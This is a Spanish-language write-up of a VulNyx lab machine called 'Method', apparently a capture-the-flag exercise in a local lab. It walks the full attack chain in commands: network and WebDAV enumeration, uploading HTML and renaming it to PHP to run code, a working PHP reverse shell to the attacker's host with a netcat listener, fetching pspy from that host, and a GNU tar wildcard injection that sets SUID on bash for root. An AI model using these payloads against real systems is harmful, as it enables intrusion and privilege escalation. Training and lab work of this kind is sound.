# VulNyx — Method | Writeup
> Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina **Blogger** de VulNyx.
## Información del laboratorio
| Campo | Información |
|---|---|
| Laboratorio | VulNyx — Method |
| Objetivo | Identificar el host, enumerar servicios, obtener acceso inicial y recuperar las flags de usuario y administrador |
| Máquina atacante | Kali Linux — `192.168.0.13` |
| Máquina objetivo | Method — `192.168.0.15` |
| Segmento de red | `192.168.0.0/24` |
| Entorno | Laboratorio local autorizado en VirtualBox |
| Acceso inicial | WebDAV → carga HTML → `MOVE` a PHP → ejecución PHP → reverse shell `www-data` |
| Escalada | Backup privilegiado con GNU tar y wildcard injection → Bash SUID → `euid=0(root)` |
| Resultado | Flags `user.txt` y `root` obtenidas según el registro de la práctica |

## 1. Reconocimiento de red

### 1.1 Identificación de la interfaz y del segmento

```bash
ip -br addr
ip route
```

La interfaz `eth0` tenía la dirección `192.168.0.13/24`, por lo que el segmento local era `192.168.0.0/24`. La puerta de enlace predeterminada era `192.168.0.1`.

<img width="1068" height="70" alt="01-red-ip" src="https://github.com/user-attachments/assets/00756435-81b2-4580-82be-c4e6ea7ea9be" />

*Evidencia: Identificación del segmento de red.*

<img width="618" height="56" alt="02-gateway" src="https://github.com/user-attachments/assets/01073b4f-d7b6-4062-9722-40e263bcbb2a" />

*Evidencia: Identificación de la puerta de enlace.*

### 1.2 Descubrimiento de hosts

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

- `-sn`: descubrimiento sin escaneo de puertos.
- `-PR`: descubrimiento ARP en la red local.
- `-oA`: guarda las salidas en los formatos principales de Nmap.

Se identificaron ocho hosts activos, entre ellos `192.168.0.15`, con MAC de una interfaz virtual de Oracle VirtualBox. La IP `192.168.0.13` correspondía a Kali.

<img width="639" height="472" alt="image" src="https://github.com/user-attachments/assets/a93308dd-2184-481e-b130-a9499c8d74b3" />


*Evidencia: Descubrimiento ARP de hosts.*

### 1.3 Escaneo completo de puertos TCP

```bash
sudo nmap -sS -p- 192.168.0.15 -oA port-scanning-full-tcp-192.168.0.15
```

| Puerto | Servicio | Estado |
|---|---|---|
| 22/tcp | SSH | Abierto |
| 80/tcp | HTTP | Abierto |

Nmap reportó 65.533 puertos TCP cerrados y dos abiertos.

<img width="605" height="176" alt="04-ports" src="https://github.com/user-attachments/assets/9fd3ad47-2550-4996-b6e6-6818ec79883f" />

*Evidencia: Escaneo completo de puertos TCP.*

### 1.4 Identificación de versiones

```bash
sudo nmap -sV -p 22,80 192.168.0.15 -oA service-detection-inicial-192.168.0.15
```

| Puerto | Software detectado |
|---|---|
| 22/tcp | OpenSSH 8.4p1 Debian 5+deb11u7 (protocolo 2.0) |
| 80/tcp | lighttpd 1.4.59 |

El servidor web en el puerto 80 se convirtió en el principal objetivo de enumeración.

<img width="766" height="217" alt="05-services" src="https://github.com/user-attachments/assets/3917c0cd-79a3-42a9-85cb-b1dd28f6112a" />

*Evidencia: Detección de servicios y versiones.*

### 1.5 Estimación del sistema operativo

```bash
sudo nmap -O 192.168.0.15 -oA os-fingerprint-192.168.0.15
```

Nmap devolvió hipótesis como Linux 4.15–5.19, OpenWrt 21.02 y MikroTik RouterOS 7.2–7.5. **Son coincidencias aproximadas de huella de red, no una identificación concluyente** del sistema operativo. La detección de servicios y la página por defecto aportaron pistas más concretas sobre un entorno Debian.

<img width="1012" height="291" alt="06-os" src="https://github.com/user-attachments/assets/27721f8a-7765-444b-bdca-46c24e24b522" />

*Evidencia: Estimación de sistema operativo mediante Nmap.*

## 2. Enumeración HTTP

### 2.1 Inspección del sitio web

Se abrió `http://192.168.0.15/` en el navegador. La respuesta mostraba la página predeterminada de lighttpd instalada por el paquete Debian. Esta página exponía rutas y referencias genéricas de configuración, pero no una aplicación funcional.

<img width="930" height="821" alt="07-web" src="https://github.com/user-attachments/assets/48742ac3-97ba-465e-9bc7-7dda3aa954e3" />

*Evidencia: Página predeterminada de lighttpd.*

### 2.2 Revisión de cabeceras

```bash
curl -I http://192.168.0.15 | tee http-headers-inicial-192.168.0.15.txt
```

Se observó `HTTP/1.1 200 OK`, `Content-Type: text/html`, `Content-Length: 3388` y `Server: lighttpd/1.4.59`. Las cabeceras permitieron confirmar la tecnología y el estado de la respuesta, pero no constituyen por sí solas una vulnerabilidad.

<img width="637" height="199" alt="08-headers" src="https://github.com/user-attachments/assets/540152b2-6f4d-4a8c-a7d9-b778e416f00d" />

*Evidencia: Verificación de cabeceras HTTP.*

### 2.3 Comprobación de robots.txt

```bash
curl -i http://192.168.0.15/robots.txt | tee http-robots-inicial-192.168.0.15.txt
```

La solicitud devolvió `404 Not Found`: no se encontró el recurso `/robots.txt`. Esto no implica que no existan otras rutas ocultas.

<img width="696" height="340" alt="09-robots" src="https://github.com/user-attachments/assets/93134f04-1bad-40fa-97e6-06277fdfe8b7" />

*Evidencia: Consulta de robots.txt con respuesta 404.*

### 2.4 Descubrimiento de directorios

```bash
gobuster dir -u http://192.168.0.15/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10 -o gobuster-common-192.168.0.15.txt
```

Gobuster identificó `/webdav` con `301 Moved Permanently` hacia `/webdav/`. El directorio se convirtió en el principal vector a investigar. Se consideraron diccionarios más amplios, pero la evidencia mostrada corresponde al diccionario `common.txt`.

<img width="979" height="323" alt="10-gobuster" src="https://github.com/user-attachments/assets/424e7411-1642-4022-95d5-aa6b6184e3df" />

*Evidencia: Descubrimiento del directorio /webdav/.*

## 3. Enumeración del servicio WebDAV

WebDAV (*Web Distributed Authoring and Versioning*) extiende HTTP para gestionar recursos y colecciones remotas. La presencia del servicio no es por sí sola una vulnerabilidad: el riesgo depende de la autenticación, los permisos y la interpretación de archivos.

### 3.1 Enumeración de métodos HTTP

```bash
curl -i -X OPTIONS http://192.168.0.15/webdav/
```

El servidor respondió `200 OK` e incluyó:

```http
DAV: 1,2,3
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK, OPTIONS, GET, HEAD, POST
```

| Método | Propósito |
|---|---|
| PROPFIND | Consultar propiedades y recursos |
| PUT | Crear o reemplazar un recurso |
| MOVE | Mover o renombrar un recurso |
| MKCOL | Crear una colección |
| DELETE | Eliminar un recurso |
| COPY | Copiar un recurso |
| PROPPATCH | Modificar propiedades |

El encabezado `Allow` indica métodos anunciados; su uso efectivo debe validarse por separado.

<img width="525" height="155" alt="11-options" src="https://github.com/user-attachments/assets/0376ef43-671d-4958-8f23-519645cf4513" />

*Evidencia: Enumeración de métodos WebDAV permitidos.*

### 3.2 Consulta de propiedades con PROPFIND

```bash
curl -i -X PROPFIND -H 'Depth: 0' http://192.168.0.15/webdav/
```

La respuesta `207 Multi-Status` devolvió metadatos XML de la colección, incluido `resourcetype` de colección, sin enumerar sus hijos.

<img width="478" height="468" alt="12-propfind0" src="https://github.com/user-attachments/assets/4a45eb44-78db-4842-9e0e-e63a95022a31" />

*Evidencia: PROPFIND Depth 0: propiedades de la colección.*

### 3.3 Enumeración de recursos con Depth: 1

```bash
curl -i -X PROPFIND \
  -H 'Depth: 1' \
  http://192.168.0.15/webdav/ \
  | tee http-webdav-depth1.txt
```

Se obtuvo de nuevo `207 Multi-Status`. En esa etapa la respuesta mostraba la colección `/webdav/` sin archivos hijos adicionales. `Depth: 1` solicita propiedades de la colección y sus hijos inmediatos, si los hay y son visibles.

<img width="477" height="647" alt="13-propfind1" src="https://github.com/user-attachments/assets/a1238e66-5320-4892-ba8b-4c7d1f073fb6" />

*Evidencia: PROPFIND Depth 1: enumeración inicial.*

### 3.4 Primer intento de escritura: archivo TXT rechazado

```bash
echo 'WebDAV test' > prueba.txt
curl -i -X PUT --data-binary @prueba.txt \
  http://192.168.0.15/webdav/prueba.txt
```

La respuesta fue `403 Forbidden`. Se constató que la escritura no era indiscriminada: al menos esta extensión/ruta fue rechazada. Este fallo motivó comprobar otros tipos de archivo.

<img width="530" height="379" alt="14-put-denied" src="https://github.com/user-attachments/assets/3ba085ca-0a7b-4015-8245-aa8861754833" />

*Evidencia: Intento fallido de carga de prueba.txt mediante PUT.*

### 3.5 Evaluación automatizada con DAVTest

```bash
davtest -url http://192.168.0.15/webdav/
```

DAVTest pudo crear un directorio con `MKCOL` y cargar un archivo `.html` mediante `PUT`, pero informó fallos para extensiones como `php`, `pl`, `aspx`, `cfm`, `shtml`, `cgi`, `jhtml`, `asp`, `jsp` y `txt`. La prueba de ejecución de HTML también falló, lo que **no significa** que el navegador no pueda renderizar HTML; DAVTest comprueba otro comportamiento. Los resultados sugirieron controles por extensión y permisos de escritura selectivos.

<img width="907" height="486" alt="15-davtest" src="https://github.com/user-attachments/assets/0b6a722a-3eae-4b24-be86-126699541933" />

*Evidencia: Resultados de DAVTest: MKCOL y PUT HTML exitosos.*

## 4. Validación manual de carga, lectura y renombrado

### 4.1 Creación y subida de HTML

```bash
echo '<h1>Prueba WebDAV</h1>' > prueba.html
curl -i -X PUT \
  --data-binary @prueba.html \
  http://192.168.0.15/webdav/prueba.html
```

Resultado: `HTTP/1.1 201 Created`. Se confirmó que el servicio aceptaba el archivo HTML sin solicitar credenciales en la prueba.

<img width="510" height="26" alt="16-put-html" src="https://github.com/user-attachments/assets/39804ebc-ff86-4c95-8f0c-8e88a6cabc2b" />

*Evidencia: Carga exitosa de archivo HTML mediante PUT.*

### 4.2 Lectura mediante GET y renderizado en navegador

```bash
curl -i http://192.168.0.15/webdav/prueba.html
```

Resultado: `200 OK`, `Content-Type: text/html` y el cuerpo `<h1>Prueba WebDAV</h1>`. Al abrir el recurso en Firefox, el navegador mostró el encabezado. Se comprobó la publicación de contenido HTML controlado por el cliente.

<img width="560" height="139" alt="17-get-html" src="https://github.com/user-attachments/assets/109e3845-9993-4423-a2df-a26ba0eb675b" />

*Evidencia: Verificación HTTP GET del HTML cargado.*

<img width="772" height="153" alt="18-browser-html" src="https://github.com/user-attachments/assets/c63ddf1c-a8a9-4943-b997-d982ae5069fa" />

*Evidencia: Renderizado del HTML cargado en Firefox.*

### 4.3 Renombrado mediante MOVE

```bash
curl -i -X MOVE \
  -H 'Destination: http://192.168.0.15/webdav/prueba-renombrada.html' \
  -H 'Overwrite: F' \
  http://192.168.0.15/webdav/prueba.html
```

Resultado: `201 Created`. La consulta posterior a `/webdav/prueba-renombrada.html` devolvió `200 OK`. Esto confirmó que `MOVE` permitía renombrar recursos.

<img width="583" height="139" alt="19-move-html" src="https://github.com/user-attachments/assets/cfb6d625-e396-4fe6-87e1-541c435ee636" />

*Evidencia: Renombrado de HTML mediante MOVE.*

<img width="509" height="135" alt="20-get-moved" src="https://github.com/user-attachments/assets/3e886fd9-1398-407c-a036-c11d3e5aa885" />

*Evidencia: Acceso al archivo HTML renombrado.*

### 4.4 Cambio de extensión de HTML a PHP

```bash
echo 'Prueba de cambio de extension' > test-extension.html
curl -i -X PUT --data-binary @test-extension.html \
  http://192.168.0.15/webdav/test-extension.html
curl -i -X MOVE \
  -H 'Destination: http://192.168.0.15/webdav/test-extension.php' \
  -H 'Overwrite: F' \
  http://192.168.0.15/webdav/test-extension.html
curl -i http://192.168.0.15/webdav/test-extension.php
```

Tanto la carga como el renombrado devolvieron `201 Created`; la lectura del recurso `.php` devolvió `200 OK` y el texto de prueba. Dado que DAVTest había rechazado la carga directa de PHP, el cambio de extensión mediante `MOVE` mostró una inconsistencia relevante entre operaciones. **Todavía no probaba interpretación PHP**, porque el archivo contenía texto plano.

<img width="608" height="761" alt="21-move-php" src="https://github.com/user-attachments/assets/1ccddd78-cafe-419c-a906-96301aa90905" />

*Evidencia: Renombrado de HTML a PHP con MOVE.*

<img width="557" height="553" alt="22-get-php" src="https://github.com/user-attachments/assets/b6643a6f-2329-4a17-a5d0-ae8e14fe5ecc" />
 
*Evidencia: GET del recurso con extensión PHP.*

### 4.5 Confirmación de interpretación PHP

```bash
printf '<?php echo "PHP_INTERPRETADO_CORRECTAMENTE"; ?>\n' > validacion.html
curl -i -X PUT --data-binary @validacion.html \
  http://192.168.0.15/webdav/validacion.html
curl -i -X MOVE \
  -H 'Destination: http://192.168.0.15/webdav/validacion.php' \
  -H 'Overwrite: F' \
  http://192.168.0.15/webdav/validacion.html
curl -i http://192.168.0.15/webdav/validacion.php
```

La respuesta `200 OK` incluyó **solo** `PHP_INTERPRETADO_CORRECTAMENTE`, no el código fuente PHP. Esto confirmó que el servidor procesaba PHP en la ruta WebDAV tras el renombrado. Se pasó de una carga de archivos a ejecución de código PHP del lado del servidor.

<img width="655" height="20" alt="23-php-file" src="https://github.com/user-attachments/assets/743a8a92-52eb-4f5b-ba0f-02f4f08c0f63" />

*Evidencia: Preparación de HTML con código PHP.*

<img width="484" height="138" alt="24-php-confirm" src="https://github.com/user-attachments/assets/e7ac6364-f1c7-4b8e-9894-7692e5d19855" />

*Evidencia: Confirmación de interpretación de PHP.*

## 5. Acceso inicial: reverse shell

### 5.1 Preparación del archivo de conexión

Se preparó un archivo `conexion.html` con PHP que abría una conexión TCP hacia Kali (`192.168.0.13:4444`) y vinculaba los descriptores de entrada y salida de `/bin/sh -i` a esa conexión.

```php
<?php
$ip = '192.168.0.13';
$port = 4444;
$sock = fsockopen($ip, $port);
if ($sock) {
    $proc = proc_open(
        '/bin/sh -i',
        array(0 => $sock, 1 => $sock, 2 => $sock),
        $pipes
    );
}
?>
```

Se usó la misma secuencia ya validada: `PUT` del archivo `.html` y `MOVE` hacia `conexion.php`.

```bash
curl -i -X PUT --data-binary @conexion.html \
  http://192.168.0.15/webdav/conexion.html
curl -i -X MOVE \
  -H 'Destination: http://192.168.0.15/webdav/conexion.php' \
  -H 'Overwrite: F' \
  http://192.168.0.15/webdav/conexion.html
```

El renombrado devolvió `201 Created`.

<img width="443" height="229" alt="25-reverse-payload" src="https://github.com/user-attachments/assets/604d275c-500a-4a5d-8acc-23a622ad0123" />

*Evidencia: Preparación de conexión PHP inversa.*

<img width="505" height="135" alt="26-reverse-move" src="https://github.com/user-attachments/assets/0b328d6f-bd77-4517-b898-7e16e1610b32" />

*Evidencia: Renombrado del archivo de conexión a PHP.*

### 5.2 Listener y conexión

En Kali:

```bash
nc -lvnp 4444
```

Se solicitó `http://192.168.0.15/webdav/conexion.php` para activar la conexión. Netcat recibió una sesión desde `192.168.0.15`. La shell avisó `can't access tty; job control turned off`, propio de una shell sin TTY interactiva completa.

```bash
whoami
id
```

Salida observada:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Resultado:** acceso inicial al sistema como `www-data`.

<img width="480" height="182" alt="27-reverse-shell" src="https://github.com/user-attachments/assets/21e98524-2188-48b9-a013-e40ee92f6157" />

*Evidencia: Reverse shell recibida y usuario www-data.*

### 5.3 Flag de usuario

Durante la sesión se localizó y obtuvo `user.txt`. En el material recibido no aparece una captura legible de su contenido ni una ruta definitiva, por lo que no se inventa ninguno de esos datos. Para el registro reproducible, el procedimiento de búsqueda fue:

```bash
find /home -type f -name 'user.txt' 2>/dev/null
```

**Estado:** flag de usuario obtenida según la confirmación de la práctica; valor omitido.

## 6. Enumeración local para escalada de privilegios

### 6.1 Inspección de cron y temporizadores

```bash
whoami
id
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/backups/
systemctl list-timers --all
```

`/etc/crontab` mostraba tareas periódicas habituales; `/etc/cron.d/` contenía entradas como `php` y `e2scrub_all`, sin una orden WebDAV explícita. La lista de ocho temporizadores systemd tampoco reveló directamente el backup. En `/var/backups/` sí apareció **`webdav.tgz`**, propiedad de root.

<img width="481" height="358" alt="28-cron" src="https://github.com/user-attachments/assets/9d6db1b1-5590-4cb1-86b0-ccaac7b19547" />

*Evidencia: Revisión de cron y descubrimiento de webdav.tgz.*

<img width="479" height="484" alt="29-timers" src="https://github.com/user-attachments/assets/f2cacce5-dbac-4cf4-b2e2-7abf17c65353" />

*Evidencia: Inspección de temporizadores systemd.*

### 6.2 Metadatos y contenido del backup

```bash
stat /var/backups/webdav.tgz
tar -tzvf /var/backups/webdav.tgz
```

El archivo era propiedad de `root`, tenía permisos `0644` y se modificaba durante la sesión. Su contenido incluía archivos creados previamente mediante WebDAV: el directorio de DAVTest, `conexion.php`, `prueba-renombrada.html`, `test-extension.php` y `validacion.php`.

Esta evidencia demostró que el backup incorporaba recursos controlados por `www-data`, aunque por sí sola no permitía conocer el comando exacto ni su periodicidad.

<img width="478" height="183" alt="30-backup-stat" src="https://github.com/user-attachments/assets/c1d4d9c6-8472-4c45-89fd-cc0ffc58278f" />

*Evidencia: Metadatos del archivo de respaldo.*

<img width="479" height="236" alt="31-backup-files" src="https://github.com/user-attachments/assets/d7524ee5-e559-4453-a84a-c2f1cb088654" />

*Evidencia: Listado del contenido del respaldo WebDAV.*

### 6.3 Transferencia de pspy64

Para observar procesos de corta duración sin privilegios de administrador se empleó [pspy](https://github.com/DominicBreuker/pspy).

En Kali, desde el directorio que contenía `pspy64`:

```bash
python3 -m http.server 8000
```

En Method:

```bash
cd /tmp
curl -f http://192.168.0.13:8000/pspy64 -o pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

El primer intento de ejecución devolvió `Permission denied`; se solucionó aplicando `chmod +x`.

<img width="480" height="268" alt="32-http-server" src="https://github.com/user-attachments/assets/74e23ee7-d4c9-4ea9-9807-6b49f0975be8" />

*Evidencia: Servidor HTTP temporal en Kali para transferir pspy64.*

<img width="488" height="325" alt="33-pspy-transfer" src="https://github.com/user-attachments/assets/9b190dd5-6937-4fda-b05e-a4278ba9002a" />

*Evidencia: Descarga de pspy64 en Method.*

<img width="492" height="774" alt="34-pspy-start" src="https://github.com/user-attachments/assets/af510d4c-af38-484a-8f92-6c251ef66c33" />

*Evidencia: Ejecución de pspy64.*

### 6.4 Descubrimiento de la tarea vulnerable

pspy64 capturó una ejecución como `UID=0`:

```text
/bin/sh -c cd /var/www/html/webdav/ && tar -zcf /var/backups/webdav.tgz *
```

También observó el proceso `tar` y la compresión `gzip`. El problema era la expansión del comodín `*` dentro de un directorio donde `www-data` podía crear archivos: nombres que comienzan por `--` podían ser tratados como opciones de GNU tar.

<img width="491" height="146" alt="35-pspy-root" src="https://github.com/user-attachments/assets/8afd5b3e-79da-45dc-b431-63b5d818450d" />

*Evidencia: pspy64 identifica backup ejecutado como root con comodín.*

## 7. Escalada de privilegios: GNU tar Wildcard Injection

### 7.1 Preparación de la inyección

En el directorio controlado por `www-data`:

```bash
cd /var/www/html/webdav
echo 'chmod u+s /bin/bash' > run.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh run.sh'
ls -la
```

Los nombres de los dos archivos especiales se expandían en la orden `tar ... *` y podían activar la acción de checkpoint. El script `run.sh` buscaba establecer SUID sobre `/bin/bash`.

<img width="482" height="465" alt="36-injection-files" src="https://github.com/user-attachments/assets/9b6575d8-af16-4f5d-88b5-6f33ae095f74" />

*Evidencia: Preparación de archivos para GNU tar Wildcard Injection.*

### 7.2 Diagnóstico de ejecución privilegiada

La primera observación de `/bin/bash` todavía mostraba `-rwxr-xr-x`, sin SUID. Para separar el problema de la inyección del cambio de permisos, se sustituyó temporalmente el contenido de `run.sh` por una prueba inocua:

```bash
printf '#!/bin/sh
id > /var/www/html/webdav/resultado-ejecucion.txt
' > run.sh
```

Tras la siguiente ejecución del backup, el archivo de diagnóstico contenía:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Conclusión:** la acción se ejecutó efectivamente como root. La ausencia de los archivos `--checkpoint` dentro del archivo comprimido era consistente con que `tar` los tratara como opciones, pero la prueba `id` fue la evidencia concluyente de ejecución privilegiada.

### 7.3 Activación de SUID y shell privilegiada

Se restauró el script original:

```bash
printf '#!/bin/sh
chmod u+s /bin/bash
' > run.sh
```

Después de la ejecución periódica de la tarea, se verificó:

```text
-rwsr-xr-x 1 root root ... /bin/bash
```

Finalmente:

```bash
/bin/bash -p
id
whoami
```

La salida confirmó:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
```

**Resultado:** shell con UID efectivo 0, es decir, privilegios efectivos de root. El UID real permaneció como `www-data`, una distinción importante para interpretar correctamente `id`.

<img width="480" height="141" alt="37-root" src="https://github.com/user-attachments/assets/e81f2c86-f691-442d-ab53-05c5d435868b" />

*Evidencia: Bash con SUID y confirmación de euid=0(root).*

### 7.4 Flag de administrador

Con los privilegios efectivos de root se completó el objetivo del laboratorio y se obtuvo la flag de administrador, según la confirmación de la práctica.

## 8. Cadena de ataque resumida

```text
Reconocimiento de red (192.168.0.0/24)
    ↓
Host Method (192.168.0.15)
    ↓
Nmap: SSH 22 / HTTP 80 — lighttpd 1.4.59
    ↓
Gobuster: /webdav/ (301)
    ↓
OPTIONS / PROPFIND / DAVTest
    ↓
PUT HTML permitido; PUT TXT/PHP restringido
    ↓
MOVE HTML → PHP permitido
    ↓
Interpretación PHP confirmada
    ↓
Reverse shell como www-data
    ↓
Backup webdav.tgz y pspy64
    ↓
Root ejecuta tar con * en directorio escribible
    ↓
GNU tar Wildcard Injection
    ↓
Ejecución de comandos como root
    ↓
SUID sobre /bin/bash → bash -p → euid=0
    ↓
Flags de usuario y administrador
```

## 10. Conclusiones

El laboratorio demostró una cadena de explotación de dos etapas. En la primera, un servicio WebDAV permitió cargar HTML, renombrarlo a PHP y ejecutarlo del lado del servidor, lo que facilitó el acceso inicial como `www-data`. En la segunda, una tarea de respaldo ejecutada como root procesaba archivos controlados por ese usuario mediante una expansión insegura de comodines. La inyección de argumentos de GNU tar permitió ejecutar comandos con UID 0 y activar SUID sobre Bash, obteniendo una shell con privilegios efectivos de root.

La práctica también dejó aprendizajes metodológicos: registrar resultados negativos, diferenciar capacidades anunciadas de capacidades comprobadas, verificar cada transición de impacto y documentar la escalada con evidencias independientes.

> **Limpieza del laboratorio:** restaurar la instantánea de la VM o los permisos originales de `/bin/bash` y eliminar los artefactos de prueba. No trasladar esta técnica a sistemas fuera del alcance autorizado.

## 11. Herramientas utilizadas

- Nmap: descubrimiento, escaneo de puertos, versiones y huella de sistema operativo.
- curl: inspección HTTP y métodos WebDAV.
- Gobuster: enumeración de directorios.
- DAVTest: pruebas de carga y ejecución en WebDAV.
- Firefox: verificación de renderizado HTML.
- Netcat: recepción de reverse shell.
- Python HTTP server: transferencia temporal de herramientas.
- pspy64: observación de procesos privilegiados.
- GNU tar: inspección de backup y análisis de wildcard injection.

---



